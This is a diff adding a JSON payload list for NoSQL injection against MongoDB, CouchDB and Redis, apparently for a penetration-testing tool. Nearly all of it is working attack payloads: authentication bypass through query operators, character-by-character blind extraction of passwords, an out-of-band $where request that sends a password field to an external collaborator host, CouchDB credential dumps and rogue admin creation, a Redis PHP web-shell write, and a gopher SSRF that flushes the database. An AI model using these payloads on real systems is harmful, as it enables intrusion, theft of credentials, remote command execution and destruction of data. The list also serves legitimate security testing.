@@ -1,0 +1,37 @@
+{
+  "meta": {
+    "name": "NoSQL Injection",
+    "icon": "🍃",
+    "description": "NoSQL injection payloads for MongoDB, CouchDB, and Redis. Covers authentication bypass, operator injection, blind detection, and OOB exfiltration.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 25
+  },
+  "payloads": [
+    {"id":1,"code":"{ \"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"} }","description":"MongoDB auth bypass — $gt operator matches any non-empty string, bypassing login","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","auth-bypass","operator"]},
+    {"id":2,"code":"{ \"username\": \"admin\", \"password\": {\"$gt\": \"\"} }","description":"MongoDB auth bypass targeting admin — force password comparison to succeed","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","auth-bypass","admin"]},
+    {"id":3,"code":"{ \"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"} }","description":"Regex operator bypass — $regex with wildcard matches any value","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","regex","auth-bypass"]},
+    {"id":4,"code":"{ \"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"} }","description":"$ne (not equal) operator — password must simply not equal a dummy value","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","ne","auth-bypass"]},
+    {"id":5,"code":"{ \"username\": {\"$in\": [\"admin\",\"administrator\",\"root\"]}, \"password\": {\"$gt\": \"\"} }","description":"$in operator — try multiple usernames at once with password bypass","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","in","operator"]},
+    {"id":6,"code":"{ \"$where\": \"sleep(5000)\" }","description":"$where with sleep — time-based blind NoSQL injection via JS execution","category":"blind","platform":["mongodb"],"tags":["nosql","mongodb","blind","time-based","where"]},
+    {"id":7,"code":"{ \"$where\": \"this.password.length > 0\" }","description":"$where field enumeration — test field existence and length via JS expressions","category":"blind","platform":["mongodb"],"tags":["nosql","mongodb","blind","where","enumeration"]},
+    {"id":8,"code":"{ \"$where\": \"this.password[0] == 'a'\" }","description":"$where character brute-force — extract password char by char via boolean blind","category":"blind","platform":["mongodb"],"tags":["nosql","mongodb","blind","character","brute"]},
+    {"id":9,"code":"{ \"username\": \"admin\", \"password\": {\"$regex\": \"^a\"} }","description":"Regex blind extraction — iterate regex anchors to extract field values char by char","category":"blind","platform":["mongodb"],"tags":["nosql","mongodb","blind","regex","extraction"]},
+    {"id":10,"code":"username=admin&password[$gt]=","description":"HTTP parameter pollution — inject MongoDB operators via query string in web apps","category":"http-parameter","platform":["mongodb"],"tags":["nosql","mongodb","parameter","http","pollution"]},
+    {"id":11,"code":"username=admin&password[$ne]=invalid","description":"URL parameter $ne injection — many Node.js/Express apps parse this into a MongoDB operator","category":"http-parameter","platform":["mongodb"],"tags":["nosql","mongodb","http","ne","express"]},
+    {"id":12,"code":"username[$regex]=.*&password[$regex]=.*","description":"URL-based regex operator — inject into query string for regex auth bypass","category":"http-parameter","platform":["mongodb"],"tags":["nosql","mongodb","regex","url","express"]},
+    {"id":13,"code":"{ \"$where\": \"function(){var x=new XMLHttpRequest();x.open('GET','http://BURPCOLLAB/?leak='+this.password,false);x.send();return true;}\" }","description":"OOB exfiltration via $where — send field value to external server (needs outbound from DB host)","category":"oob","platform":["mongodb"],"tags":["nosql","mongodb","oob","exfiltration","where"]},
+    {"id":14,"code":"db.collection.find({\"$comment\": \"injected\", \"a\": \"b\"})","description":"$comment operator injection — inject into query comments, can break filters","category":"detection","platform":["mongodb"],"tags":["nosql","mongodb","comment","detection"]},
+    {"id":15,"code":"' || '1'=='1","description":"NoSQL string injection probe — single quote injection to detect string concatenation into queries","category":"detection","platform":["mongodb","couchdb"],"tags":["nosql","probe","detection","string"]},
+    {"id":16,"code":"true, $where: '1 == 1'","description":"JSON body injection probe — inject $where via loose JSON parsing in some frameworks","category":"detection","platform":["mongodb"],"tags":["nosql","mongodb","probe","detection","where"]},
+    {"id":17,"code":"/_all_docs?include_docs=true","description":"CouchDB all docs endpoint — access all documents without authentication if misconfigured","category":"couchdb","platform":["couchdb"],"tags":["nosql","couchdb","disclosure","all-docs"]},
+    {"id":18,"code":"/_users/_all_docs?include_docs=true","description":"CouchDB users database — dump all user records including hashed credentials","category":"couchdb","platform":["couchdb"],"tags":["nosql","couchdb","users","credential-dump"]},
+    {"id":19,"code":"PUT /_users/org.couchdb.user:attacker {\"name\":\"attacker\",\"password\":\"pass\",\"roles\":[\"_admin\"],\"type\":\"user\"}","description":"CouchDB admin user creation — register new admin via /_users if signup is open","category":"couchdb","platform":["couchdb"],"tags":["nosql","couchdb","privilege","admin","create"]},
+    {"id":20,"code":"GET /_config/admins","description":"CouchDB config endpoint — read admin credentials and config (requires admin or misconfiguration)","category":"couchdb","platform":["couchdb"],"tags":["nosql","couchdb","config","admin"]},
+    {"id":21,"code":"KEYS *","description":"Redis KEYS * — list all keys in the database, works when Redis is exposed without auth","category":"redis","platform":["redis"],"tags":["nosql","redis","keys","enumeration"]},
+    {"id":22,"code":"CONFIG SET dir /var/www/html","description":"Redis config write — change working directory to web root for web shell write (RCE via SSRF)","category":"redis","platform":["redis"],"tags":["nosql","redis","rce","config","webshell"]},
+    {"id":23,"code":"CONFIG SET dbfilename shell.php\r\nSET payload \"<?php system($_GET['cmd']); ?>\"\r\nBGSAVE","description":"Redis web shell write — set directory + filename then BGSAVE to write PHP shell to webroot","category":"redis","platform":["redis"],"tags":["nosql","redis","rce","webshell","bgsave"]},
+    {"id":24,"code":"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a","description":"SSRF → Redis via gopher — flush Redis DB via SSRF using gopher protocol","category":"redis","platform":["redis"],"tags":["nosql","redis","ssrf","gopher","flush"]},
+    {"id":25,"code":"{ \"username\": {\"$exists\": true}, \"password\": {\"$exists\": true} }","description":"$exists operator — returns any document where both fields exist, useful for auth bypass","category":"authentication-bypass","platform":["mongodb"],"tags":["nosql","mongodb","exists","auth-bypass"]}
+  ]
+}
